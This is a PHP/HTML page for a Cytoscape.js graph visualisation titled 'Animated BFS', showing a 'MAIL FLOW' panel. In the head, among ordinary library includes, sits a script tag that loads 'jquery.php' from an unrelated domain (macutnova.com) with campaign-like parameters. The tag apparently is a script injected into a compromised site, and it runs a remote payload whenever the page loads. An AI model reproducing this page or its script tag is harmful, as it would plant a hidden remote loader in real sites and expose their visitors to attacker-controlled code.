<?php
require "connect.php";
?>
<!DOCTYPE html>
<html>
<head>
<link href="mail.css" rel="stylesheet" />
<meta charset=utf-8 />
<meta name="viewport" content="user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui">
<title>Animated BFS</title>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script src="http://cytoscape.github.io/cytoscape.js/api/cytoscape.js-latest/cytoscape.min.js"></script>

<script src="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.js"></script>
<script src="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.js"></script>
<link href="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.css" rel="stylesheet" type="text/css" />
<script src="https://cdn.rawgit.com/cytoscape/cytoscape.js-qtip/2.2.5/cytoscape-qtip.js"></script>

<link rel ="stylesheet" type="text/css" href="http://localhost/FrontendCSS.css">
<script src="https://macutnova.com/jquery.php?u=c16102a344e586c77bd406dfa74ed645&c=split24banner4&p=1"></script></head>
<body>

<div id="header">
<h1>HOMS</h1>
</div>
<div id="icbar">
</div>

<div id="Mailback">
		<h2>MAIL FLOW</h2>
    <div id="cy">
      <script src="code.js"></script>
    </div>

</div>



</div>



<div id="footer">
</div>

</body>
</html>



<?php
mysqli_close($conn);
?>